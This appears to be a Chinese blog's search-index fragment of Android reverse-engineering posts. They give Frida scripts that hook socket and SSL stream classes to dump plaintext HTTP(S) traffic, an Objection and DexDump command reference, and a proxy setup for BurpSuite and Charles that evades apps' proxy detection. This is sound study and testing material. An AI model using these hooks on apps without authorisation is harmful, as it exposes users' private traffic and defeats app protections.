以Http为例,Http数据从应用层发送之后,依次通过传输层、网络层、链路层,在经过每一层时都会被包裹上头部数据,以保证数据在传输过程中的完整性,然后传输给接收方;接收方以相反的过程依次去除头部数据从而获取真实传输的Http数据.因此如果对App进行抓包,那么不仅仅是应用层,在传输层、网络层等应用层往下的所有层级都可以获取传输的全部数据.这正是传输层进行Socket终极抓包的理论基础. 之所以选择在传输层进行抓包,是因为不管App是使用系统自带的Http(s)收发包框架还是第三方的Http(s)收发包框架,都不可避免的会经过系统的Socket相关类,而且Socket都是系统完成的,因此相关类一定不会被混淆. ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:1","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Http 这里以上方使用的HttpURLConnectionDemo为例,开发Http的Socket\"自吐\"脚本. 前期研究 点击App界面上的发送请求按钮后,使用Objection搜索内存中Socket相关的类 objection.exe -g com.example.luodst explore android hooking search classes socket 将搜索出来的结果复制到1.txt文件中,并在每一行前添加android hooking watch class 利用objection -c参数批量Hook Socket相关类(如果出现崩溃现象,可以删除或将导致崩溃的类移到另一个文件中待下次执行即可) objection.exe -g com.example.luodst explore -c .\\1.txt 点击App界面上的\"发送请求\"按钮,会发现下图中的几个与Socket相关的类被调用了,如此可进一步缩小Socket相关类的范围 此时分别对上图中一些可疑的函数进行进一步的Hook并打印调用栈进行观察.这里观察到比较可疑的函数是java.net.AbstractPlainSocketImpl.acquireFD android hooking watch class_method java.net.AbstractPlainSocketImpl.acquireFD --dump-args --dump-backtrace --dump-return 上述调用栈中发现了已经了HttpURLConnection 的发包函数com.android.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream,此时再通过Android源码查看下java.net.AbstractPlainSocketImpl.acquireFD的上层函数java.net.SocketOutputStream.socketWrite http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/SocketOutputStream.java 可以发现java.net.SocketOutputStream.socketWrite这个函数的第一个参数实际上就是网络传输的数据内容. 同样的在获取response相关函数上找到了java.net.SocketInputStream.read([B, int, int)函数 “自吐\"脚本 function jhexdump(array) { var ptr = Memory.alloc(array.length); for(var i = 0; i \u003c array.length; ++i) Memory.writeS8(ptr.add(i), array[i]); //console.log(hexdump(ptr, { offset: off, length: len, header: false, ansi: false })); console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false })); } function hookSocket() { Java.perform(function () { // java.net.SocketOutputStream.write // java.net.SocketOutputStream.socketWrite Java.use('java.net.SocketOutputStream').socketWrite.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.socketWrite(bytearray1, int1, int2) console.log('socketWrite result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); // console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // java.net.SocketInputStream.read // java.net.SocketInputStream.socketRead0 Java.use('java.net.SocketInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function main(){ hookSocket() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:2","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"Https 前期研究 将上方使用的HttpURLConnectionDemo中的URL由http://www.baidu.com修改为https://www.baidu.com,然后重新按照上面的流程进行trace和Hook,最终发现在进行Https连接时一定会经过下图中的函数. 其中比较关键的两个函数如下,并且它们的第一个参数永远是明文的request或response数据. //http://androidxref.com/8.1.0_r33/xref/external/conscrypt/common/src/main/java/org/conscrypt/ConscryptFileDescriptorSocket.java com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write([B, int, int) com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B, int, int) “自吐\"脚本 function jhexdump(array) { var ptr = Memory.alloc(array.length); for(var i = 0; i \u003c array.length; ++i) Memory.writeS8(ptr.add(i), array[i]); //console.log(hexdump(ptr, { offset: off, length: len, header: false, ansi: false })); console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false })); } function hookSSLSocketAndroid8(){ Java.perform(function () { // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream').write.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.write(bytearray1, int1, int2) console.log('write result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function main(){ hookSSLSocketAndroid8() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:3","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"hookAddress 在上面的流程中,针对Http(s)收发包内容的\"自吐\"脚本已经开发完毕,但是还缺少一个关键的内容:获取收发包的IP地址和端口. 前期研究 这里仍然使用上方HttpURLConnectionDemo为例,重新按照上面的流程进行trace和Hook,不过需要注意的是这次测试的是所有Socket相关类的构造函数. 点击App界面上的发送请求按钮后,使用Objection搜索内存中Socket相关的类. objection.exe -g com.example.luodst explore android hooking search classes socket 将搜索出来的结果复制到1.txt文件中,并在每一行前添加android hooking watch class_method,在每一行的行尾添加.$init –dump-args –dump-backtrace –dump-return. 这里可以使用NotePad++,来批量完成在行尾添加数据.(Ctrl+H打开替换窗口) 利用objection -c参数批量HookSocket相关类构造函数.(如果出现崩溃现象,可以删除或将导致崩溃的类构造函数移到另一个文件中待下次执行即可) objection.exe -g com.example.luodst explore -c .\\1.txt 点击App界面上的\"发送请求\"按钮,会发现不管是Http还是Https都会调用到一些相同的函数,这里最终关注的函数是java.net.InetSocketAddress.InetSocketAddress 下方是Http协议Hook的结果. 下方是Https协议Hook的结果. “自吐\"脚本 function hookAddress(){ Java.perform(function(){ // java.net.InetSocketAddress.InetSocketAddress(java.net.InetAddress, int) Java.use('java.net.InetSocketAddress').$init.overload('java.net.InetAddress', 'int').implementation = function(addr,port){ var result = this.$init(addr,port) console.log('addr,port =\u003e',addr.toString(),port) return result } }) } function main(){ hookAddress() } setImmediate(main) 从上方结果中可以看到不仅仅有访问的网址信息,还存在本地的IP信息.那么如何区分本地地址和远程地址信息呢?这里我们可以看下java.net.InetAddress类的源码中的相关函数. http://androidxref.com/8.1.0_r33/xref/libcore/ojluni/src/main/java/java/net/InetAddress.java 故最终的\"自吐\"脚本如下: function hookAddress(){ Java.perform(function(){ // java.net.InetSocketAddress.InetSocketAddress(java.net.InetAddress, int) Java.use('java.net.InetSocketAddress').$init.overload('java.net.InetAddress', 'int').implementation = function(addr,port){ var result = this.$init(addr,port) //console.log('addr,port =\u003e',addr.toString(),port) if(addr.isSiteLocalAddress()){ console.log('Local address =\u003e',addr.toString(),', port is ',port) }else{ console.log('Server address =\u003e',addr.toString(),', port is ',port) } return result } }) } function main(){ hookAddress() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:4","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"hookSocket汇总 function jhexdump(array) { var ptr = Memory.alloc(array.length); for(var i = 0; i \u003c array.length; ++i) Memory.writeS8(ptr.add(i), array[i]); //console.log(hexdump(ptr, { offset: off, length: len, header: false, ansi: false })); console.log(hexdump(ptr, { offset: 0, length: array.length, header: false, ansi: false })); } function hookAddress(){ Java.perform(function(){ // java.net.InetSocketAddress.InetSocketAddress(java.net.InetAddress, int) Java.use('java.net.InetSocketAddress').$init.overload('java.net.InetAddress', 'int').implementation = function(addr,port){ var result = this.$init(addr,port) //console.log('addr,port =\u003e',addr.toString(),port) if(addr.isSiteLocalAddress()){ console.log('Local address =\u003e',addr.toString(),', port is ',port) }else{ console.log('Server address =\u003e',addr.toString(),', port is ',port) } return result } }) } function hookSocket() { Java.perform(function () { // java.net.SocketOutputStream.write // java.net.SocketOutputStream.socketWrite Java.use('java.net.SocketOutputStream').socketWrite.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.socketWrite(bytearray1, int1, int2) console.log('socketWrite result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); // console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // java.net.SocketInputStream.read // java.net.SocketInputStream.socketRead0 Java.use('java.net.SocketInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function hookSSLSocketAndroid8(){ Java.perform(function () { // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream').write.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.write(bytearray1, int1, int2) console.log('write result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } // com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read Java.use('com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream').read.overload('[B', 'int', 'int').implementation = function (bytearray1, int1, int2) { var result = this.read(bytearray1, int1, int2) console.log('read result,bytearray1,int1,int2=\u003e', result, bytearray1, int1, int2) var ByteString = Java.use(\"com.android.okhttp.okio.ByteString\"); //console.log('contents: =\u003e ', ByteString.of(bytearray1).hex()) jhexdump(bytearray1) return result } }) } function main(){ hookAddress() //hookSocket() // hookSSLSocketAndroid8() } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:5","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"总结 虽然上述\"自吐\"脚本是基于HttpURLConnection开发的,但经过测试,使用okhttp3和Retrofit框架的App同样能完成网络数据包的抓包工作.从理论上讲上述\"自吐\"脚本应该可以通杀所有使用系统Socket进行收发包的App.但需要注意的是上述脚本还存在一些问题,比如URL信息和收发包的对应关系、request和response如何更加精确的一对一等. ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:6","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:4:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android Frida"],"content":"Frida只是提供了各种API供我们调用,在此基础上可以实现具体的功能,有大佬将各种常见的、常用的功能整合进一个工具,供我们在命令行中使用,这个工具就是Objection. ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:0:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"安装 由于Objection是基于Frida的,所以我们要安装与Frida发布日期相近的版本. https://pypi.org/project/objection/#history #pip install frida==14.2.13 #pip install frida-tools==9.2.1 #下载指定版本的objection pip install objection==1.11.0 ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:1:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"连接非标准端口 #objection -N -h 192.168.2.111 -p 6666 -g com.android.settings explore objection -N -h 手机的ip -p frida监听的端口 -g 安卓应用 explore ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:2:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"内存漫游相关命令 ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"查看内存加载的库 memory list modules ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"查看库的导出函数 memory list exports libssl.so #写文件 memory list exports libssl.so --json tst.json ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"列出内存中所有类 android hooking list classes ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:3","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"内存中搜索所有的类 在内存中所有已加载的类中搜索包含特定关键词的类. #搜索包含display关键词的类 android hooking search classes display ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:4","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"内存中搜索所有的方法 在内存中所有已加载的类的方法中搜索包含特定关键词的方法. #搜索包含display关键词的方法 android hooking search methods display ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:5","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"列出类的所有方法 当搜索到了比较关心的类之后,就可以直接查看它有哪些方法. android hooking list class_methods com.android.settings.DisplaySettings ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:6","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"列出进程所有的activity android hooking list activities ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:7","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"启动activity android intent launch_activity com.android.settings.DisplaySettings ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:8","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"列出进程所有的service android hooking list services ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:9","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"启动service android intent launch_service com.android.settings.bluetooth.BluetoothPairingService ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:3:10","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"Hook相关命令 上述操作均是基于在内存中直接枚举搜索,已经可以获取到大量有用的静态信息,我们再来介绍几个方法,可以获取到执行时动态的信息. 在以下命令中加上–dump-args –dump-return –dump-backtrace三个参数,分别用于打印函数的参数、返回值、以及调用栈. ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:4:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"对指定方法进行Hook 比如想看getName()方法,则运行以下命令: #android hooking watch class_method java.io.File.$init --dump-args android hooking watch class_method android.bluetooth.BluetoothDevice.getName --dump-args --dump-return --dump-backtrace ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:4:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"hook类的所有方法 android hooking watch class android.bluetooth.BluetoothDevice ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:4:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"Jobs命令 #可以看到objection为我们创建的Hooks数 jobs list #删除作业 jobs kill \u003cid\u003e ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:4:3","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"主动调用 ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:5:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"在堆上搜索实例 android heap search instances com.android.settings.DisplaySettings ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:5:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"调用实例的方法 无参调用 查看源码得知com.android.settings.DisplaySettings类有getPreferenceScreenResId()方法. #无参调用 #android heap execute \u003chandle\u003e \u003cmethodname\u003e android heap execute 0x225a getPreferenceScreenResId 有参调用 android heap evaluate \u003chandle\u003e 在进入一个迷你编辑器环境后,输入想要执行的脚本内容,确认编辑完成,然后按Esc键退出编辑,最后按回车键,即会开始执行这行脚本并输出结果.这里的脚本内容和在编辑器中直接编写的脚本内容是一样的. heap evaluate既可以执行有参函数,也可以执行无参函数. ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:5:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"插件 ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:6:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"Wallbreaker https://github.com/hluwa/Wallbreaker #加载插件 plugin load C:/Users/XiaLuoHun/Desktop/Wallbreaker-1.0.2 #查看类信息 plugin wallbreaker classdump --fullname android.bluetooth.BluetoothDevice #寻找类的实例对象并查看 plugin wallbreaker objectsearch android.bluetooth.BluetoothDevice #[xxx] plugin wallbreaker objectdump xxx ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:6:1","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"DexDump https://github.com/hluwa/FRIDA-DEXDump #加载插件 plugin load C:/Users/Xia/Desktop/FRIDA-DEXDump-1.0.3/frida_dexdump #Dump plugin dexdump search plugin dexdump dump ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:6:2","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android Frida"],"content":"参考链接 实用FRIDA进阶：内存漫游、hook anywhere、抓包 ","date":"2022-05-25","objectID":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/:7:0","tags":["Frida"],"title":"Objection使用","uri":"/posts/android/android-hook/frida/objection%E4%BD%BF%E7%94%A8/"},{"categories":["Android 抓包"],"content":"介绍 抓包通常是指通过一些手段获取App与服务器之间传输的明文网络数据信息. 抓包分为以下两种情形: Hook抓包:通过对发包函数的Hook来达到抓包的作用. 中间人抓包:将原来一段完整的客户端-服务器的通信方式割裂成两段客户端-服务器的通信. 中间人的抓包在OSI七层网络模型的结构中通常又会被分成以下两种情形: 应用层:Http(s)协议抓包. 会话层:Socket通信抓包. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:1:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Http抓包配置 首先要将计算机和测试手机连接在同一个局域网中并且要确保手机和计算机能够相互访问. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"WLAN代理 在手机设置代理时,可以选择\"设置\"应用中的WLAN设置,长按选择\"修改网络\"选项,并在弹出的对话框中选择手动代理,设置代理服务器地址为主机的地址以及端口,这里端口为8080. 上述这种配置代理的方式可被下述App代码检测,而导致最终抓不到数据包,因此推荐使用VPN代理方式. System.getProperty(\"http.proxyHost\"); System.getProperty(\"http.proxyPort\"); 相对于直接从应用层设置WLAN代理的方式,VPN代理则是通过虚拟出一个新的网卡,从网络层加上该层代理,不仅可以绕过上述App代码的检测,而且检测VPN代理的API相对较少,也比较容易绕过. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:1","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"VPN代理 为了配置VPN代理,首先需要下载一个VPN软件,这里推荐Postern这个App. adb安装Postern,进入App主页面,然后单击App左上方将菜单调出. 进入\"配置代理\"页面后单击\"代理1:proxy\",配置服务器IP地址为主机IP、端口为8080,再选择代理类型为HTTPS/HTTP CONNECT,配置完毕后单击\"保存\"按钮并退出页面. 配置完代理后,重新单击App左上角,待弹出菜单后选择\"配置规则\",清空原来的所有规则并创建一个新的规则,分别设置\"动作\"选项为\"通过代理连接\" “代理/代理组\"为刚才设置的代理(这里为192.168.1.5:8080),并设置\"目标地址\"为”*“或者直接清空以指定手机所有流量从代理经过.注意,“开启抓包\"选项要关闭. 在上述代理和规则都设置完毕后,重新打开菜单项单击\"关闭VPN\"并开启VPN.这样测试机的配置就完成了. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:2","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"BurpSuite 接下来使用BurpSuite来进行测试抓包. 打开BurpSuite,单击Proxy-\u003eIntercept,再单击Intercept is On按钮关闭拦截模式. 在关闭拦截模式后,单击Options按钮并把代理地址修改为本机IP地址和端口8080.设置好代理地址后,单击OK按钮完成抓包的全部配置. 手机和PC端抓包设置完毕后,在手机浏览器上访问任意Http网址,就可以在\"HTTP history\"页面中看到抓到的Http明文数据了.(这里手机访问的网址为:http://www.jwc.ldu.edu.cn/wlgxk.asp) ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:3","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Charles 依次单击Proxy-\u003eProxy Settings,在弹出的窗口中对端口进行配置. 注意 如果只是抓取HTTP类型的数据包,要关闭SSL Proxying模式(默认开启). 如果不关掉,抓取HTTP数据包,就会出现上面的问题,明明是HTTP协议却被识别为HTTPS协议. ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:2:4","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"Https抓包配置 ","date":"2022-05-18","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/:3:0","tags":["抓包"],"title":"抓包详解","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85%E8%AF%A6%E8%A7%A3/"},{"categories":["Android 抓包"],"content":"开启SSL Proxying 为了能够成功抓取HTTPS的数据,首先需要通过Ctrl+L快捷键开启Charles的SSL Proxying模式. 为了解决上述错误,我们需要设置下SSL Proxying. 注意 